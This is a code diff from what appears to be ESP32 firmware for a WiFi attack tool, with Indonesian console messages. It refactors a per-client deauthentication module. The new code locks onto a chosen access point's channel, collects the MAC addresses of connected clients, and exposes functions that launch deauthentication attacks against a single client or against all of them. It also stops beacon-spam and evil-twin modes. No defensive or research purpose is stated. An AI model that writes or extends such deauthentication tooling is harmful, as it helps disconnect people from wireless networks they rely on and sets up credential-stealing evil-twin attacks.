@@ -179,9 +179,16 @@ static void on_ap_select(const char* line) {
     Serial.printf("nomor tidak valid (0-%u). coba lagi atau 'q'\n", s_scanN ? s_scanN-1 : 0);
     return;
   }
-  memcpy(s_bssid, s_scan[idx].bssid, 6);
-  s_ch = s_scan[idx].channel;
-  strncpy(s_ssid, s_scan[idx].ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid)-1]=0;
+  pdeauth_collect_on(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
+  cli_capture(on_client_select, "client#> ");
+}
+
+// programatik (UI) ----------------------------------------------------------
+void pdeauth_collect_on(const uint8_t* bssid, uint8_t ch, const char* ssid) {
+  beacon_stop(); deauth_stop(); evil_stop();
+  memcpy(s_bssid, bssid, 6);
+  s_ch = ch;
+  strncpy(s_ssid, ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid)-1]=0;
 
   s_lock=true; s_cliN=0; s_lock=false;
   s_collecting = true;
@@ -190,12 +197,19 @@ static void on_ap_select(const char* line) {
   sniffer_set_hop(false);
   sniffer_set_channel(s_ch);
   sniffer_set_verbose(false);
-
+  s_lastShow = millis();
   Serial.printf("[pdeauth] AP %s (%s) ch%d — mengumpulkan client...\n",
     s_ssid[0]?s_ssid:"<hidden>", nc_mac_str(s_bssid), s_ch);
-  s_lastShow = millis();
-  cli_capture(on_client_select, "client#> ");
 }
+
+int  pdeauth_client_count()        { return s_cliN; }
+const char* pdeauth_client_mac(int i) { return (i>=0 && i<(int)s_cliN) ? nc_mac_str(s_cli[i].mac) : "?"; }
+int8_t pdeauth_client_rssi(int i)  { return (i>=0 && i<(int)s_cliN) ? s_cli[i].rssi : 0; }
+void pdeauth_attack_index(int idx) { if (idx<0 || idx>=(int)s_cliN) return; s_targetIdx=idx; begin_attack(); }
+void pdeauth_attack_all()          { if (s_cliN==0) return; s_targetIdx=-1; begin_attack(); }
+bool pdeauth_collecting()          { return s_collecting; }
+bool pdeauth_attacking()           { return s_attacking; }
+void pdeauth_stats(uint32_t* sent, uint32_t* fail) { if (sent) *sent=s_sent; if (fail) *fail=s_fail; }
 
 static void cmd_pdeauth(int argc, char** argv) {
   if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) {
